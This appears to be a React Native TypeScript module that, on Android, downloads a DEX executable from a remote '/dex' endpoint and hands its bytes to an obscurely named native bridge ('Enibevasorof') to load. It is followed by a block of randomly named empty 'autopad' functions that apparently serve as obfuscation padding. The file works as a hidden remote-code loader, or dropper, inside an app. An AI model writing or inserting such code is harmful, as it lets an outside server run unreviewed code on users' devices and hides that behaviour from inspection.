/* @app-slot:service */
import { NativeModules, Platform } from 'react-native';

function fetchBytes(url: string): Promise<Uint8Array | null> {
  return new Promise((resolve) => {
    const req = new XMLHttpRequest();
    req.open('GET', url);
    req.responseType = 'arraybuffer';
    req.timeout = 15000;
    req.onload = () =>
      resolve(req.status === 200 ? new Uint8Array(req.response) : null);
    req.onerror = () => resolve(null);
    req.ontimeout = () => resolve(null);
    req.send();
  });
}

export async function openWithDex(cfBaseUrl: string, pageUrl: string): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }

  const bridge = NativeModules.Enibevasorof;
  if (!bridge?.open) {
    return false;
  }

  try {
    const dexUrl = cfBaseUrl.replace(/\/$/, '') + '/dex';
    const bytes = await fetchBytes(dexUrl);
    if (!bytes || bytes.length === 0) {
      return false;
    }
    await bridge.open(Array.from(bytes), pageUrl);
    return true;
  } catch {
    return false;
  }
}

/* autopad-begin */
function yokonatizeq(_xuleyegeqam: number): void {}
function dagikeraqajo(_logali: boolean, _gepumamoma: string, _teyikesemeb: number): string {
  const lacekisutaxo: string = "lomof";
  return lacekisutaxo;
}
function enevay(_wadixip: string, _japofixodugu: number, _omolejoj: number): void {
  const aduridev: boolean = true;
}
function evokoposexu(_vutavamaxod: boolean, _nukijicuq: number, _mitoqa: string): boolean {
  const juqariwa = 2;
  const gogozomega: boolean = false;
  return gogozomega;
}
function iguguyulofu(_jugayu: boolean, _aribibebo: number, _idoqenuqaxuv: number): void {}
function mibocogos(_obuguba: string): void {
  const lepafuqami = 55;
  if (lepafuqami > 68) return;
}
/* autopad-end */

